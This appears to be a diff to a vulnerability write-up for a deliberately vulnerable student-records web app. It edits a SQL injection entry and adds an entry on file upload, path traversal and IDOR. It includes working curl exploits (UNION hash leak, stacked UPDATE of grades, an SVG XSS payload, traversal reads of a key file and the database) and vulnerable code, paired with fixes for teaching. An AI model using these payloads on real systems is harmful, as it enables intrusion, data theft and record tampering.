@@ -379,16 +379,16 @@ against attackers who can write to the *database*, which is the threat here.
 
 ---
 
-## 10. SQL injection — people directory (stacked write)
+## 10. SQL injection — course search (stacked write)
 
-**Where:** `app.py → h_search` (`GET /api/search?query=`). The search term is
-concatenated into a `LIKE` pattern and run with `db.run_raw_multi`, which also
-executes **stacked** statements (`;`-separated):
+**Where:** `app.py → h_search` (`GET /api/search?query=`), the **Course search**
+page. The search term is concatenated into a `LIKE` pattern and run with
+`db.run_raw_multi`, which also executes **stacked** statements (`;`-separated):
 
 ```python
 # VULN
-sql = ("SELECT id, full_name, role FROM users "
-       "WHERE full_name LIKE '%" + query + "%' ORDER BY full_name")
+sql = ("SELECT id, code, name FROM courses "
+       "WHERE name LIKE '%" + query + "%' OR code LIKE '%" + query + "%' ORDER BY code")
 rows = db.run_raw_multi(conn, sql)   # runs every statement in the string
 ```
 
@@ -396,7 +396,8 @@ Unlike #1 and #2 (read-only injections), this one gives an attacker a **write
 primitive** — and it needs no admin login and no access to the Gradebook page.
 Any logged-in user (a student) can change any grade straight from the search box.
 
-**Exploit A** — UNION read, leak password hashes (3 columns to match):
+**Exploit A** — UNION read, leak password hashes (the result has 3 columns —
+`id, code, name` — so a 3-column UNION lines up):
 
 ```bash
 TOK=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
@@ -404,7 +405,7 @@ TOK=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
 
 curl -s -G "$B/api/search" -H "Authorization: Bearer $TOK" \
   --data-urlencode "query=' UNION SELECT id, password_hash, role FROM users -- "
-# every user's MD5 hash appears in the full_name column
+# every user's MD5 hash appears in the 'code' column
 ```
 
 **Exploit B** — stacked `UPDATE`, change Alice's Mathematics grade (course 1):
@@ -416,7 +417,7 @@ curl -s -G "$B/api/search" -H "Authorization: Bearer $TOK" \
 # rewrote their own grade through a search box.
 ```
 
-In the browser: log in as `alice` / `password1`, open **Directory**, and paste
+In the browser: log in as `alice` / `password1`, open **Course search**, and paste
 the Exploit B string into the search field. The search shows no matches, but the
 Math grade on the Dashboard is now 20/20. The vuln build has no ledger, so (as in
 #9) nothing detects it.
@@ -547,6 +548,57 @@ only the random token from the server log works, once.
 
 ---
 
+## 15. Unrestricted file upload + path traversal + IDOR (documents)
+
+**Where:** `app.py → _save_upload`, `h_request_document`, `h_decide_document`,
+`h_download_document`. Students attach a PDF to a document request; the registrar
+uploads the issued PDF when approving. The vuln build trusts everything:
+
+```python
+# VULN _save_upload: client filename trusted, no type/size check
+name = fs.filename or "upload.bin"
+fs.save(os.path.join(UPLOAD_DIR, name))
+
+# VULN download: no ownership check, client-controlled path, served INLINE
+name = request.args.get("name") or stored
+return send_file(os.path.join(UPLOAD_DIR, name))
+```
+
+**Exploit A — stored XSS via upload type** — upload a `.svg`/`.html` "document"
+containing a script; it is served inline, so it runs when anyone opens it
+(including the registrar reviewing the request):
+
+```bash
+printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > evil.svg
+ID=$(curl -s -X POST $B/api/documents -H "Authorization: Bearer $TOK" \
+     -F "doc_type=Attestation d'inscription" -F "attachment=@evil.svg" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
+# open  $B/api/documents/$ID/download?which=request  in a browser -> the script runs
+```
+
+**Exploit B — path traversal (arbitrary file read)** — the `name` parameter is
+joined onto the upload path with no sanitisation, so it escapes the directory:
+
+```bash
+curl -s "$B/api/documents/$ID/download?name=../../keys/eth_issuer.key" -H "Authorization: Bearer $TOK"
+#   -> leaks the on-chain issuer private key
+curl -s "$B/api/documents/$ID/download?name=../../sms_vuln.db"          -H "Authorization: Bearer $TOK" -o stolen.db
+#   -> downloads the entire database
+```
+
+**Exploit C — IDOR** — any logged-in user downloads any document's file by id,
+regardless of owner (`?which=request` on someone else's document id).
+
+**Impact:** stored XSS against staff, disclosure of server secrets (signing key,
+database) and of other students' documents. **Fix (secure build):** ignore the
+client filename and store under a random name; require a real PDF (magic bytes)
+under a size cap; serve only the file recorded for that document id, as an
+`attachment` with a fixed `application/pdf` type, never from a client path; and
+enforce owner/staff authorization on download. **Verify:** `evil.svg` is rejected
+("only PDF files are accepted"); `?name=…` is ignored; another student's file
+returns `403`; a valid PDF downloads as an attachment.
+
+---
+
 ## Surfaced realistically (not new flaws)
 
 Three existing flaws were moved off-screen so they're found the way they would be in
@@ -577,11 +629,12 @@ a real engagement, without changing whether they exist:
 | 7 | Unsalted MD5 passwords | PBKDF2 + salt |
 | 8 | No signatures / no encryption at rest | Ed25519 signatures + AES-GCM |
 | 9 | No integrity anchoring (tampering undetected) | issuer-only smart contract: anchor hashes on write, verify on read |
-| 10 | SQLi in people search (stacked write → grade change) | parameterized query, single statement |
+| 10 | SQLi in course search (stacked write → grade change) | parameterized query, single statement |
 | 11 | Stored XSS in announcements | HTML-escape on output |
 | 12 | IDOR on documents | ownership/role check |
 | 13 | Mass assignment on profile update | server-side field whitelist |
 | 14 | Predictable password-reset token | random, hashed, single-use, expiring token |
+| 15 | Unrestricted upload + path traversal + IDOR (documents) | PDF-only + random name, fixed id/path, attachment, authz |
 
 **Secure-build business rules** (flaws only in the vuln build, not numbered attacks):
 grades must be numeric and within 0–20; certificates enforce a minimum grade
